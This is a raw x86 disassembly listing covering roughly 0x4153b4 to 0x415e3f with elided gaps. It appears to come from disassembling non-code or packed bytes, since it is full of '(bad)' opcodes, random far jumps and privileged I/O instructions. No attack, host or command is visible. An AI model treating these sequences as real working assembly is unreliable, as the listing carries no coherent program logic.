  4153b4:	sub    al,0xbf
  4153b6:	popa   
  4153b7:	aam    0x25
  4153b9:	dec    eax
  4153ba:	pop    ds
  4153bb:	inc    ebx
  4153bc:	gs test eax,0xd8b727c1
  4153c2:	mov    esp,0x95ab4743
  4153c7:	mov    ah,0x20
  4153c9:	sub    BYTE PTR [edi+ebx*8],0x5c
  4153cd:	sar    al,0xab
  4153d0:	ins    DWORD PTR es:[edi],dx
  4153d1:	xlat   BYTE PTR ds:[ebx]
  4153d2:	js     0x41539f
  4153d4:	repz clc 
  4153d6:	push   edi
  4153d7:	lds    edi,FWORD PTR [edx+0x6a]
  4153da:	enter  0xb904,0xc5
  4153de:	or     BYTE PTR [esi-0x72],al
  4153e1:	in     eax,0xbf
  4153e3:	mov    bl,0x98
  4153e5:	jno    0x415439
  4153e7:	call   0xfd5a:0xce708fe9
	...
  415456:	ins    DWORD PTR es:[edi],dx
  415457:	lock repz jmp FWORD PTR cs:[edi]
  41545c:	std    
  41545d:	repz mov edi,0x6ad3e5b0
  415463:	aaa    
  415464:	push   ebp
  415465:	add    DWORD PTR [edi-0x1b],esp
  415468:	add    BYTE PTR [eax],al
  41546a:	add    BYTE PTR [ecx],al
  41546c:	add    BYTE PTR [eax],al
  41546e:	mov    ebx,0x2d1ca30
  415473:	ret    0x24d9
  415476:	pop    edi
  415477:	inc    ebx
  415478:	dec    esp
  415479:	and    eax,0xfac2b50a
  41547e:	push   esi
  41547f:	cdq    
  415480:	and    ch,bl
  415482:	stc    
  415483:	mov    esp,0xbd95d74
  415488:	or     bh,BYTE PTR [edi]
  41548a:	je     0x4154ec
  41548c:	xchg   ebp,eax
  41548d:	leave  
  41548e:	dec    ecx
  41548f:	xchg   BYTE PTR [ebx-0x76],al
  415492:	cmp    al,BYTE PTR [ebx+eax*1+0x2477b040]
  415499:	push   eax
  41549a:	into   
  41549b:	mov    bh,0x32
  41549d:	jns    0x4154b7
  41549f:	sahf   
  4154a0:	mov    DWORD PTR [edi-0x92e4acc],ecx
  4154a6:	ret    
  4154a7:	popa   
  4154a8:	adc    eax,0x28
  4154ab:	mov    edx,DWORD PTR [edi+0xb]
  4154ae:	push   ebx
  4154af:	sub    DWORD PTR [ebp+0x4e630c1f],ebx
  4154b5:	and    al,BYTE PTR [edi+0x6]
  4154b8:	stos   BYTE PTR es:[edi],al
  4154b9:	add    al,0xde
  4154bb:	je     0x4154d3
  4154bd:	xchg   edi,eax
  4154be:	and    dh,dh
  4154c0:	xchg   ebx,eax
  4154c1:	inc    ebx
  4154c2:	lock add ecx,ebx
  4154c5:	sub    BYTE PTR [edx],ch
  4154c7:	push   esp
  4154c8:	sbb    al,0xd2
  4154ca:	pop    ss
  4154cb:	and    edx,DWORD PTR ds:[edi+0x7c]
  4154cf:	repnz int3 
  4154d1:	push   cs
  4154d2:	mov    WORD PTR [eax+esi*1+0x2f29f7e3],?
  4154d9:	int    0x7b
  4154db:	je     0x415492
  4154dd:	sbb    ah,BYTE PTR [ebp+0x2b3ebfa8]
  4154e3:	xchg   ebp,eax
  4154e4:	fcomi  st,st(0)
  4154e6:	mov    ecx,0x4c72a02f
  4154eb:	(bad)  
  4154ec:	ja     0x41553f
  4154ee:	xchg   ebp,eax
  4154ef:	ins    DWORD PTR es:[edi],dx
  4154f0:	(bad)  [ecx-0x15]
  4154f3:	sub    BYTE PTR [edx],cl
  4154f5:	xor    eax,0xd74bac4a
  4154fa:	xchg   BYTE PTR [ebp+0x2fedbed9],dh
  415500:	test   al,0xd3
  415502:	scas   eax,DWORD PTR es:[edi]
  415503:	or     eax,0xa09c87f7
  415508:	mov    eax,0xe3e434e1
  41550d:	cmp    al,0x82
  41550f:	push   es
  415510:	mov    eax,0xe03f1e29
  415515:	xor    al,0x39
  415517:	jp     0x415563
  415519:	dec    eax
  41551a:	into   
  41551b:	mov    ecx,0xd9016496
  415520:	addr16 jne 0x41557b
  415523:	push   0x308f63f7
  415528:	mov    ah,0x59
  41552a:	aas    
  41552b:	dec    edi
  41552c:	fadd   st,st(0)
  41552e:	cmp    eax,0xb28f5891
  415533:	and    eax,0xe799be31
  415538:	clc    
  415539:	xor    BYTE PTR [esp+eax*4],bl
  41553c:	dec    esi
  41553d:	push   0x18
  41553f:	pushf  
  415540:	and    ah,BYTE PTR [ebp+ebx*4+0x4b]
  415544:	ja     0x4155bb
  415546:	imul   eax,DWORD PTR [ebp-0x21],0xffffffc7
  41554a:	aad    0x73
  41554c:	ror    BYTE PTR [esi],cl
  41554e:	sbb    ecx,DWORD PTR [eax-0x25]
  415551:	mov    esi,0xe6e10afc
  415556:	fwait
  415557:	sysret 
  415559:	adc    ebp,DWORD PTR [ecx-0x7d]
  41555c:	ins    DWORD PTR es:[edi],dx
  41555d:	jne    0x415540
  41555f:	jmp    0x17dd5277
  415564:	fs jecxz 0x41559f
  415567:	inc    ebx
  415568:	add    al,0xf9
  41556a:	pop    esp
  41556b:	ficom  WORD PTR [edi+0x8e]
	...
  4155d5:	add    ah,ah
  4155d7:	lock sub DWORD PTR [edx],ecx
  4155da:	cmp    eax,0xa2fee7db
  4155df:	arpl   WORD PTR [ebx],bp
  4155e1:	je     0x4155c2
  4155e3:	dec    esi
  4155e4:	cmp    ebx,ebp
  4155e6:	addr16 out 0x0,al
  4155e9:	add    BYTE PTR [eax],al
  4155eb:	add    DWORD PTR [eax],eax
  4155ed:	add    BYTE PTR [eax+esi*1+0x5d7c7da8],dl
  4155f4:	sar    DWORD PTR [ebx+0x61ab14b2],cl
  4155fa:	rol    BYTE PTR [ebp+0x15],0xad
  4155fe:	aam    0xcf
  415600:	call   0xe4b9:0xecd363ae
  415607:	push   ecx
  415608:	pusha  
  415609:	jno    0x41559c
  41560b:	fisubr DWORD PTR [ebx-0x5dd9f662]
  415611:	and    esi,DWORD PTR [esi+0x35]
  415614:	mov    al,0xe0
  415616:	dec    ecx
  415617:	leave  
  415618:	pop    ds
  415619:	ins    DWORD PTR es:[edi],dx
  41561a:	mov    edi,0x9324ca4
  41561f:	in     al,0xef
  415621:	out    dx,al
  415622:	mov    ebx,0x231779f6
  415627:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415628:	stos   BYTE PTR es:[edi],al
  415629:	add    eax,0xa2ecedb4
  41562e:	adc    bh,BYTE PTR [ecx]
  415630:	je     0x415633
  415632:	mov    ch,BYTE PTR [ecx+0x39070550]
  415638:	pop    esp
  415639:	cld    
  41563a:	mov    BYTE PTR [edi+0x72e9ae79],bh
  415640:	fimul  WORD PTR [esp+esi*4+0x1f]
  415644:	adc    al,0x2b
  415646:	mov    ds:0x7cfd8168,eax
  41564b:	fnsave [ebx+0x5a]
  41564e:	in     eax,dx
  41564f:	mov    eax,ds:0x99fc88da
  415654:	scas   al,BYTE PTR es:[edi]
  415655:	mov    al,ds:0xb224586f
  41565a:	fnstenv [edi-0x3753ef18]
  415660:	mov    al,ds:0x937825fc
  415665:	xor    eax,edi
  415667:	jl     0x4156e5
  415669:	add    eax,0x55a58f02
  41566e:	jecxz  0x4156ec
  415670:	push   DWORD PTR [ebx]
  415672:	push   eax
  415673:	jo     0x4156ca
  415675:	inc    ebx
  415676:	adc    ebx,edi
  415678:	clc    
  415679:	cdq    
  41567a:	mov    dl,0x1e
  41567c:	push   edi
  41567d:	xchg   esp,eax
  41567e:	dec    ebx
  41567f:	sub    ah,BYTE PTR [ebx-0x75]
  415682:	ins    BYTE PTR es:[edi],dx
  415683:	in     eax,dx
  415684:	in     eax,dx
  415685:	mov    esp,0xd3e7cd16
  41568a:	xchg   edx,eax
  41568b:	adc    eax,0x4045eeea
  415690:	and    ch,BYTE PTR [ebx+0x33549756]
  415696:	sbb    eax,DWORD PTR [esi-0x19029283]
  41569c:	sti    
  41569d:	push   ecx
  41569e:	dec    eax
  41569f:	outs   dx,DWORD PTR ds:[esi]
  4156a0:	das    
  4156a1:	(bad)  
  4156a3:	jns    0x4156b8
  4156a5:	mov    eax,ds:0xaac12728
  4156aa:	mov    ebx,0x458d5b89
  4156af:	inc    esi
  4156b0:	inc    esi
  4156b1:	(bad)  
  4156b2:	fcom   QWORD PTR [esi+ebx*1+0x363d8e4b]
  4156b9:	ja     0x4156fe
  4156bb:	das    
  4156bc:	sub    DWORD PTR [eax],ecx
  4156be:	inc    eax
  4156bf:	cmp    BYTE PTR [edx+edi*4],al
  4156c2:	(bad)  
  4156c3:	cmp    eax,0xfb5af5b
  4156c8:	sub    BYTE PTR [edi-0x67a66017],cl
  4156ce:	sub    ah,ch
  4156d0:	dec    esp
  4156d1:	jmp    0xa930:0x8ebc372e
  4156d8:	retf   
  4156d9:	inc    edi
  4156da:	rol    BYTE PTR [ebp+ebx*4+0x3bd2082a],0xed
  4156e2:	jne    0x4156e3
  4156e4:	cmp    DWORD PTR [ebx-0x7b],0xc4c8cb3f
  4156eb:	jecxz  0x4156dd
  4156ed:	test   BYTE PTR [eax],0x0
	...
  415754:	add    BYTE PTR [eax],al
  415756:	ins    DWORD PTR es:[edi],dx
  415757:	call   0xbafd:0x67ff45bc
  41575e:	mov    bl,0xba
  415760:	inc    esi
  415761:	sub    al,0xac
  415763:	inc    ebp
  415764:	jg     0x4157db
  415766:	addr16 out 0x0,eax
  415769:	add    BYTE PTR [eax],al
  41576b:	add    DWORD PTR [eax],eax
  41576d:	add    BYTE PTR [edx],dh
  41576f:	fiadd  DWORD PTR [eax-0x40]
  415772:	outs   dx,BYTE PTR ds:[esi]
  415773:	(bad)  
  415774:	mov    cl,0xbd
  415776:	(bad)  
  415778:	dec    ebx
  415779:	mov    esi,0x5514d651
  41577e:	jne    0x415746
  415780:	cmp    eax,0x9cd2815d
  415785:	pusha  
  415786:	pop    eax
  415787:	push   ecx
  415788:	or     eax,0x714c4b0e
  41578d:	adc    BYTE PTR [ebp+0x3244bc3f],0xa0
  415794:	(bad)  
  415795:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415796:	and    DWORD PTR [ebp+0x78832717],ecx
  41579c:	int    0x2d
  41579e:	mov    dl,0xc2
  4157a0:	dec    ecx
  4157a1:	leave  
  4157a2:	dec    eax
  4157a3:	dec    ebx
  4157a4:	test   BYTE PTR [ebx+0x1d],al
  4157a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4157a8:	rcr    BYTE PTR ds:0xf08f9bf6,cl
  4157ae:	es jmp 0x25377676
  4157b4:	rol    cl,cl
  4157b6:	mov    WORD PTR [ebp-0x3a],?
  4157b9:	pop    esi
  4157ba:	repz mov esi,0x798ee108
  4157c0:	repz dec esi
  4157c2:	arpl   WORD PTR [edx-0x1a1a329f],bp
  4157c8:	mov    eax,ds:0x8baf7d36
  4157cd:	and    cl,dh
  4157cf:	retf   
  4157d0:	xor    bl,BYTE PTR ds:0x3ccbb17c
  4157d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4157d7:	loop   0x4157e2
  4157d9:	daa    
  4157da:	(bad)  
  4157db:	fcmovnb st,st(3)
  4157dd:	nop
  4157de:	sbb    BYTE PTR [eax-0x589aa2f6],dh
  4157e4:	mov    ds:0x79c89128,al
  4157e9:	shl    DWORD PTR [eax],cl
  4157eb:	push   cs
  4157ec:	(bad)  
  4157ed:	int3   
  4157ee:	xchg   BYTE PTR [edx],dl
  4157f0:	mov    bl,0x49
  4157f2:	iret   
  4157f3:	mov    esp,0xf6912595
  4157f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4157f9:	jne    0x415828
  4157fb:	jb     0x415847
  4157fd:	in     eax,0x9c
  4157ff:	sbb    BYTE PTR [ecx],bl
  415801:	mov    edi,0x3362de1a
  415807:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415808:	dec    ebp
  415809:	jne    0x4157e0
  41580b:	pop    ebx
  41580c:	push   esi
  41580d:	xchg   esp,eax
  41580e:	pusha  
  41580f:	mov    edi,0x4455eb67
  415814:	mov    ds:0x56f99169,al
  415819:	std    
  41581a:	add    dh,BYTE PTR [ecx]
  41581c:	cld    
  41581d:	xchg   edx,eax
  41581e:	sbb    al,0x86
  415820:	imul   edx,edx,0x45
  415823:	push   ebp
  415824:	and    DWORD PTR [eax],0xfffffffd
  415827:	(bad)  
  415828:	(bad)  
  41582a:	jbe    0x4157fa
  41582c:	cmp    eax,0x86bc6e53
  415831:	xlat   BYTE PTR ds:[ebx]
  415832:	fimul  WORD PTR [ebx+0x24]
  415835:	add    DWORD PTR [esi+0x7af96970],ecx
  41583b:	popa   
  41583c:	jl     0x41587a
  41583e:	cmp    DWORD PTR [edi],eax
  415840:	xchg   esi,eax
  415841:	sahf   
  415842:	or     DWORD PTR [eax-0x17],ecx
  415845:	or     BYTE PTR [esi-0x2443f833],dl
  41584b:	int    0x4b
  41584d:	js     0x41588a
  41584f:	sbb    al,0x4b
  415851:	sti    
  415852:	inc    ecx
  415853:	add    BYTE PTR [edi+ecx*2],ch
  415856:	jb     0x4158b3
  415858:	mov    cl,0x41
  41585a:	or     al,0x41
  41585c:	jno    0x4157f3
  41585e:	div    DWORD PTR [ebp-0x55]
  415861:	sbb    al,BYTE PTR [ebp+0x7b3a2b2b]
  415867:	add    ebx,eax
  415869:	mov    cl,0x38
  41586b:	push   ebx
  41586c:	in     al,dx
  41586d:	mov    bl,0x0
	...
  4158d3:	add    BYTE PTR [eax],al
  4158d5:	add    bl,cl
  4158d7:	(bad)  
  4158d8:	xchg   ebx,eax
  4158d9:	in     al,dx
  4158da:	mov    bh,0xed
  4158dc:	(bad)  
  4158dd:	inc    DWORD PTR [edi]
  4158df:	(bad)  
  4158e1:	rcr    DWORD PTR [ecx+0x677c6454],cl
  4158e7:	call   0x14158ec
  4158ec:	add    BYTE PTR [eax],al
  4158ee:	or     eax,0xc9d43dac
  4158f3:	loope  0x415888
  4158f5:	pop    esp
  4158f6:	aam    0x57
  4158f8:	cdq    
  4158f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4158fa:	out    0x5f,al
  4158fc:	cwde   
  4158fd:	mov    ch,bh
  4158ff:	sbb    al,0xe0
  415901:	push   0x5b2d6e39
  415906:	in     al,dx
  415907:	jge    0x415983
  415909:	clc    
  41590a:	inc    eax
  41590b:	jge    0x4158b4
  41590d:	add    al,dh
  41590f:	mov    ds:0x998a1dee,eax
  415914:	fwait
  415915:	aad    0xd3
  415917:	push   ebp
  415918:	shr    BYTE PTR [esi+0x5f],1
  41591b:	and    dh,0x6c
  41591e:	pusha  
  41591f:	sub    eax,0x8c77f2b4
  415924:	in     al,dx
  415925:	sub    eax,0xae426cef
  41592a:	xchg   BYTE PTR [ebp+0x485bfa5f],bl
  415930:	mov    al,0x57
  415932:	cs adc eax,0xba040a7c
  415938:	fcomp  QWORD PTR [eax]
  41593a:	sbb    esp,esi
  41593c:	sub    ch,BYTE PTR [esi*4-0xed72928]
  415943:	sbb    BYTE PTR [ebx+0x40],dl
  415946:	test   al,0x53
  415948:	(bad)  
  415949:	pop    ss
  41594a:	jl     0x415909
  41594c:	or     al,0x66
  41594e:	xor    dl,0xf
  415951:	aas    
  415952:	test   BYTE PTR [ebp-0x55],0xb4
  415956:	jmp    0x415923
  415958:	pop    ebx
  415959:	mov    bh,0x24
  41595b:	fild   WORD PTR cs:[ebx]
  41595e:	or     ebp,0xffffff91
  415961:	bound  eax,QWORD PTR [edx-0x5d]
  415964:	daa    
  415965:	(bad)  
  415967:	push   0xccd915b1
  41596c:	cwde   
  41596d:	jno    0x415996
  41596f:	xchg   ecx,eax
  415970:	loope  0x4159e2
  415972:	cli    
  415973:	movaps XMMWORD PTR [ebp-0x29d6be42],xmm3
  41597a:	inc    edx
  41597b:	jne    0x41594f
  41597d:	mov    dl,0xbc
  41597f:	je     0x4159a1
  415981:	test   DWORD PTR [edi],edx
  415983:	dec    ecx
  415984:	mov    ch,0x7b
  415986:	mov    WORD PTR [ebp+0xa828689],ds
  41598c:	mov    al,0xa4
  41598e:	mov    ebx,0xf0a8b300
  415993:	mov    esp,0x9fdeb603
  415998:	repz adc BYTE PTR [ebx-0x69],0x35
  41599d:	lods   eax,DWORD PTR ds:[esi]
  41599e:	in     eax,dx
  41599f:	xchg   DWORD PTR [ebx-0x17],edx
  4159a2:	dec    ebx
  4159a3:	mov    bl,0x66
  4159a5:	fst    QWORD PTR [ebx+0x2cb50834]
  4159ab:	les    eax,FWORD PTR [edx]
  4159ad:	scas   al,BYTE PTR es:[edi]
  4159ae:	jns    0x415a2f
  4159b0:	mov    edx,DWORD PTR [ebx]
  4159b2:	mov    DWORD PTR ds:0x3fab65c3,eax
  4159b8:	xchg   DWORD PTR [esi+0x1a],esp
  4159bb:	into   
  4159bc:	sbb    eax,0x5f0de233
  4159c1:	icebp  
  4159c2:	stos   DWORD PTR es:[edi],eax
  4159c3:	pop    ebp
  4159c4:	shr    BYTE PTR [ecx+0x17c856aa],cl
  4159ca:	aam    0xef
  4159cc:	jbe    0x415975
  4159ce:	data16 aad 0xc4
  4159d1:	stc    
  4159d2:	rcr    DWORD PTR [esi+eiz*4-0x9867f31],0x4f
  4159da:	dec    ebx
  4159db:	pusha  
  4159dc:	test   BYTE PTR ds:0xf9a31226,dh
  4159e2:	iret   
  4159e3:	ins    DWORD PTR es:[edi],dx
  4159e4:	rol    BYTE PTR [ecx-0x3f],0xa7
  4159e8:	pop    eax
  4159e9:	inc    ebx
  4159ea:	push   ecx
  4159eb:	mov    ds:0x86d0,eax
	...
  415a54:	add    BYTE PTR [eax],al
  415a56:	inc    ebp
  415a57:	mov    BYTE PTR [edi+esi*2],ch
  415a5a:	in     eax,dx
  415a5b:	neg    DWORD PTR [edi-0x46]
  415a5e:	sub    edi,DWORD PTR [edi-0x10]
  415a61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a62:	retf   0xe0d7
  415a65:	and    BYTE PTR [edi-0x17],ah
  415a68:	add    BYTE PTR [eax],al
  415a6a:	add    BYTE PTR [ecx],al
  415a6c:	add    BYTE PTR [eax],al
  415a6e:	cmp    al,0x41
  415a70:	sbb    ah,BYTE PTR [ebx]
  415a72:	pop    esp
  415a73:	xor    bl,BYTE PTR [edx-0x6beedc39]
  415a79:	sbb    al,0xf9
  415a7b:	(bad)  
  415a7d:	sbb    BYTE PTR [edx-0x226d3343],0x43
  415a84:	push   ecx
  415a85:	popa   
  415a86:	xor    edi,DWORD PTR [ebx+0x20]
  415a89:	push   es
  415a8a:	mov    ds:0x500db733,eax
  415a8f:	ds jg  0x415b0e
  415a92:	jle    0x415afd
  415a94:	sbb    esp,esi
  415a96:	or     al,cl
  415a98:	ret    
  415a99:	cmp    bh,0x45
  415a9c:	xchg   edx,eax
  415a9d:	int    0x5c
  415a9f:	lods   al,BYTE PTR ds:[esi]
  415aa0:	icebp  
  415aa1:	add    esp,DWORD PTR [edi-0x6107ef7b]
  415aa7:	in     al,0xa
  415aa9:	enter  0x1040,0xb4
  415aad:	xor    eax,0x95223950
  415ab2:	or     eax,0xcd942339
  415ab7:	xor    al,0x28
  415ab9:	jb     0x415a3f
  415abb:	cdq    
  415abc:	test   BYTE PTR [ebp-0x2da5cdf],bl
  415ac2:	dec    ebp
  415ac3:	(bad)  
  415ac4:	lahf   
  415ac5:	(bad)  
  415ac7:	adc    al,0x4d
  415ac9:	je     0x415a85
  415acb:	leave  
  415acc:	jg     0x415ac9
  415ace:	call   0xdfb2a5b3
  415ad3:	bound  edi,QWORD PTR [eax-0x5ec12531]
  415ad9:	stos   BYTE PTR es:[edi],al
  415ada:	test   eax,0xdb95593b
  415adf:	aaa    
  415ae0:	mov    ch,0x38
  415ae2:	jns    0x415b38
  415ae4:	outs   dx,DWORD PTR ds:[esi]
  415ae5:	xchg   esp,eax
  415ae6:	test   dl,ah
  415ae8:	lahf   
  415ae9:	mov    dh,0xeb
  415aeb:	leave  
  415aec:	or     al,0x2e
  415aee:	mov    WORD PTR [ebp-0x26],fs
  415af1:	xchg   edi,eax
  415af2:	mov    eax,0xd695d6ee
  415af7:	(bad)  
  415af8:	mov    ds:0xeaef3b43,al
  415afd:	test   eax,0x1b064595
  415b02:	rcr    bl,cl
  415b04:	sbb    DWORD PTR [edi+eiz*8+0x1a],0x1a
  415b09:	xor    eax,DWORD PTR [ecx+0x7d]
  415b0c:	loop   0x415b58
  415b0e:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  415b10:	pop    esi
  415b11:	stos   BYTE PTR es:[edi],al
  415b12:	pop    ss
  415b13:	imul   ebx,DWORD PTR [edx+0x1f2a1866],0x57
  415b1a:	mov    eax,ds:0x1a0bd39a
  415b1f:	dec    eax
  415b20:	repz iret 
  415b22:	aad    0xa5
  415b24:	sub    BYTE PTR [ebx+0x6a],0x2e
  415b28:	fcomip st,st(3)
  415b2a:	in     eax,dx
  415b2b:	cs jp  0x415ac3
  415b2e:	xor    al,0x19
  415b30:	test   BYTE PTR [edi+0x17],ch
  415b33:	test   eax,0x3532f73
  415b38:	mov    al,0x9c
  415b3a:	gs mov cl,0xf4
  415b3d:	inc    esi
  415b3e:	js     0x415b5a
  415b40:	jmp    0x92b9a947
  415b45:	push   esi
  415b46:	xchg   ebp,eax
  415b47:	jb     0x415afe
  415b49:	cld    
  415b4a:	(bad)  
  415b4b:	pop    edx
  415b4c:	test   ecx,esp
  415b4e:	out    dx,al
  415b4f:	push   0x7be4419d
  415b54:	dec    esi
  415b55:	or     al,0x36
  415b57:	or     eax,0x583a2de6
  415b5c:	adc    DWORD PTR gs:[edi-0x7f],esp
  415b60:	in     eax,dx
  415b61:	cld    
  415b62:	les    edi,FWORD PTR [edx-0x4552e49]
  415b68:	xor    al,0x16
  415b6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415b6b:	retf   0x9472
	...
  415bd6:	fistp  QWORD PTR [esi-0x449a6dfb]
  415bdc:	(bad)  
  415bde:	stc    
  415bdf:	dec    ebp
  415be0:	push   ss
  415be1:	fcomp  QWORD PTR [edi-0x8]
  415be4:	jge    0x415bde
  415be6:	addr16 jmp 0x0:0x1000000
  415bee:	inc    ebx
  415bef:	fcomp  DWORD PTR [edi+0x3bec4e7d]
  415bf5:	retf   0x5130
  415bf8:	out    0x3a,al
  415bfa:	xor    ebx,DWORD PTR [edx]
  415bfc:	aas    
  415bfd:	jns    0x415c38
  415bff:	push   edi
  415c00:	cwde   
  415c01:	in     eax,0x57
  415c03:	ja     0x415be7
  415c05:	clc    
  415c06:	or     BYTE PTR [edx-0x13],ch
  415c09:	jg     0x415c66
  415c0b:	cli    
  415c0c:	pop    edi
  415c0d:	ret    
  415c0e:	jb     0x415c18
  415c10:	imul   esi,DWORD PTR [edx],0xb1fac45c
  415c16:	sbb    esp,DWORD PTR [ebx-0x38]
  415c19:	cmp    eax,0x37e8997
  415c1e:	push   esi
  415c1f:	pop    DWORD PTR [edx+0x13]
  415c22:	clc    
  415c23:	inc    ebx
  415c24:	xor    al,0x3d
  415c26:	and    eax,0x38009730
  415c2b:	dec    esi
  415c2c:	clc    
  415c2d:	push   DWORD PTR [edi+0x2757cc0b]
  415c33:	stos   DWORD PTR es:[edi],eax
  415c34:	add    eax,0x1202b41a
  415c39:	pop    ebp
  415c3a:	push   edx
  415c3b:	fidiv  WORD PTR [ebp-0x19]
  415c3e:	jbe    0x415c23
  415c40:	xchg   ecx,eax
  415c41:	adc    BYTE PTR [esi+0x1a5f282b],dh
  415c47:	retf   
  415c48:	mov    edx,0x5afc8934
  415c4d:	cdq    
  415c4e:	out    dx,eax
  415c4f:	mov    eax,ds:0xc1bf4857
  415c54:	jecxz  0x415c1a
  415c56:	(bad)  
  415c57:	scas   eax,DWORD PTR es:[edi]
  415c58:	adc    al,0x64
  415c5a:	stos   BYTE PTR es:[edi],al
  415c5b:	pop    ebp
  415c5c:	xchg   edx,eax
  415c5d:	jmp    0x2b48:0x1e277009
  415c64:	and    eax,0x7e98bd9c
  415c69:	inc    ebx
  415c6a:	int3   
  415c6b:	or     DWORD PTR [edi+0x4],ecx
  415c6e:	in     eax,0x1
  415c70:	push   edx
  415c71:	(bad)  
  415c73:	rcl    DWORD PTR [edx+0x8],0xca
  415c77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c78:	loop   0x415c5f
  415c7a:	ret    
  415c7b:	xor    esp,DWORD PTR [eax-0x5709bc2]
  415c81:	mov    bl,0xd7
  415c83:	jecxz  0x415cde
  415c85:	and    eax,0xbb7477e6
  415c8a:	out    0x84,eax
  415c8c:	jle    0x415c8b
  415c8e:	cmp    eax,DWORD PTR [esi+0x55d1402b]
  415c94:	jo     0x415c4d
  415c96:	mov    cl,al
  415c98:	ffree  st(5)
  415c9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c9b:	pop    esp
  415c9c:	pop    ss
  415c9d:	mov    dh,0x77
  415c9f:	add    BYTE PTR [edx+0x6f],dh
  415ca2:	xchg   esp,eax
  415ca3:	sub    ebp,DWORD PTR ds:0x430eb80a
  415ca9:	fwait
  415caa:	xor    ecx,ecx
  415cac:	daa    
  415cad:	xor    eax,0x23ae80e7
  415cb2:	gs cli 
  415cb4:	push   ss
  415cb5:	push   eax
  415cb6:	fwait
  415cb7:	retf   0x4ce3
  415cba:	out    0x9f,al
  415cbc:	cli    
  415cbd:	inc    ebx
  415cbe:	inc    edx
  415cbf:	les    ecx,FWORD PTR [ecx+0x35]
  415cc2:	inc    ebp
  415cc3:	in     al,dx
  415cc4:	(bad)  
  415cc5:	mov    ds:0xcc8cbc02,eax
  415cca:	into   
  415ccb:	cmp    DWORD PTR [edi-0x49],0xfffffff2
  415ccf:	ins    BYTE PTR es:[edi],dx
  415cd0:	out    dx,al
  415cd1:	addr16 inc eax
  415cd3:	sbb    BYTE PTR [edi-0x1c754a4a],bl
  415cd9:	cli    
  415cda:	bound  ebx,QWORD PTR [ebx+0x71]
  415cdd:	in     al,0x2d
  415cdf:	leave  
  415ce0:	ret    0x14cd
  415ce3:	xor    edi,esp
  415ce5:	bound  esi,QWORD PTR [ebp+0x2d]
  415ce8:	repnz outs dx,DWORD PTR ds:[esi]
  415cea:	out    dx,al
  415ceb:	data16 jne 0x415c76
	...
  415d56:	cmp    dl,BYTE PTR [eax]
  415d58:	mov    edi,0xbbbfbf3c
  415d5d:	push   ss
  415d5e:	push   esp
  415d5f:	push   ecx
  415d60:	mov    esi,0x364ce71f
  415d65:	xchg   esi,eax
  415d66:	addr16 jmp 0x415d69
  415d69:	add    BYTE PTR [eax],al
  415d6b:	add    DWORD PTR [eax],eax
  415d6d:	add    BYTE PTR [esi-0x7d263b48],al
  415d73:	adc    eax,0xdc68691a
  415d78:	retf   
  415d79:	sub    BYTE PTR [edx+0x30678dc6],ah
  415d7f:	sbb    DWORD PTR [ecx+0x7c],ecx
  415d82:	jmp    0x449b:0x50e5aa91
  415d89:	inc    ebp
  415d8a:	cwde   
  415d8b:	fmulp  st(3),st
  415d8d:	(bad)  
  415d8e:	shl    BYTE PTR [ebp-0x18],0xef
  415d92:	loope  0x415df7
  415d94:	inc    edx
  415d95:	mov    eax,0xe3b63509
  415d9a:	loope  0x415dfb
  415d9c:	sub    ch,BYTE PTR [edi-0x1d]
  415d9f:	pop    ebp
  415da0:	clc    
  415da1:	adc    edx,ecx
  415da3:	ret    0x27a
  415da6:	retf   0xa16e
  415da9:	cld    
  415daa:	jnp    0x415d9e
  415dac:	mov    BYTE PTR [esi],bl
  415dae:	lahf   
  415daf:	inc    edx
  415db0:	outs   dx,DWORD PTR ds:[esi]
  415db1:	mov    esp,0x933996fa
  415db6:	sbb    DWORD PTR [edi+eiz*1-0x1ef77f7c],esp
  415dbd:	pop    edi
  415dbe:	pop    ss
  415dbf:	jmp    0x415deb
  415dc1:	fbstp  TBYTE PTR [esi+ebp*1-0x22]
  415dc5:	mov    bl,0x1e
  415dc7:	int3   
  415dc8:	lods   al,BYTE PTR ds:[esi]
  415dc9:	dec    ebp
  415dca:	pop    ecx
  415dcb:	das    
  415dcc:	pop    edx
  415dcd:	arpl   WORD PTR [esi-0x5a],sp
  415dd0:	fcmovnu st,st(0)
  415dd2:	or     ebp,edx
  415dd4:	mov    eax,0x90b1e160
  415dd9:	loope  0x415da4
  415ddb:	aas    
  415ddc:	and    al,0xea
  415dde:	dec    esp
  415ddf:	mov    esi,0x4ba37bcc
  415de4:	cmp    DWORD PTR ds:0xde82a019,esp
  415dea:	sub    eax,DWORD PTR ds:0x47f038fa
  415df0:	xor    edi,edx
  415df2:	retf   0x5f9c
  415df5:	je     0x415e04
  415df7:	dec    esi
  415df8:	cwde   
  415df9:	or     BYTE PTR [ebp-0x3f78ba7e],bl
  415dff:	mov    cl,0x85
  415e01:	fwait
  415e02:	jbe    0x415df4
  415e04:	shl    DWORD PTR [eax],1
  415e06:	int    0x4c
  415e08:	jl     0x415e84
  415e0a:	(bad)  
  415e0d:	jne    0x415e7e
  415e0f:	ds in  eax,0x7
  415e12:	retf   0x59f5
  415e15:	cmp    edx,DWORD PTR [ebx]
  415e17:	add    DWORD PTR [ecx+edx*8-0x67],ebx
  415e1b:	or     al,0xb0
  415e1d:	std    
  415e1e:	scas   eax,DWORD PTR es:[edi]
  415e1f:	out    0xcd,al
  415e21:	and    al,0x55
  415e23:	pushf  
  415e24:	mov    DWORD PTR [esi+ecx*2-0x7],ebx
  415e28:	push   ss
  415e29:	bound  esp,QWORD PTR [esp+ebp*2-0x798df251]
  415e30:	push   esi
  415e31:	stos   DWORD PTR es:[edi],eax
  415e32:	ret    
  415e33:	xor    cl,BYTE PTR [esi+0x4d]
  415e36:	mov    ebp,0x17c05b7e
  415e3b:	ss xor al,0x72
  415e3e:	xchg   esp,eax
  415e3f:	cs das 
